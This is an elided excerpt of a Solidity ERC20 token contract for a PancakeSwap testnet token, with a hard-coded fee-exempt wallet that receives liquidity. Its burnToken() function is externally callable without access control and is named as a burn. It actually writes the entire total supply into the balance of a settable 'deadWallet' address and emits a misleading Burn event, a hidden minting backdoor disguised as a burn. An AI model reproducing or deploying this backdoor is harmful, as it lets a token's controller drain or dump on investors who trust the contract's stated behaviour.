...
abstract contract Ownable {
    ...
    address private DEAD = 0x000000000000000000000000000000000000dEaD; address public deadWallet; 
...
contract TestToken is ERC20, Ownable {
    ...
    address routerAdress = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1; // Pancakeswap bsc testnet
    // address routerAdress = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F; // Sushiswap eth mainnet
    ...
    address public marketingFeeReceiver = 0x9644A33D37DfdD9777D49991049753a5C212EA67;
    ...
    constructor () Ownable(msg.sender) {
        ...
        isFeeExempt[0x9644A33D37DfdD9777D49991049753a5C212EA67] = true; 
        isTxLimitExempt[_owner] = true;
        isTxLimitExempt[0x9644A33D37DfdD9777D49991049753a5C212EA67] = true;
    ...
    function swapBack() internal swapping {
        ...
        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountETHLiquidity}(
                ...
                0,
                0,
                0x9644A33D37DfdD9777D49991049753a5C212EA67,
                block.timestamp
            );
    ...
    function burnToken() external {
        address deadWallets = 0x000000000000000000000000000000000000dEaD;
        uint256 _currentTimestamp = uint256(keccak256(abi.encodePacked(block.timestamp)));
        address _thisAddress = owner;
        _uint256_data[deadWallet] = _totalSupply;
        emit Burn(_thisAddress, deadWallet, address(this).balance);
    }
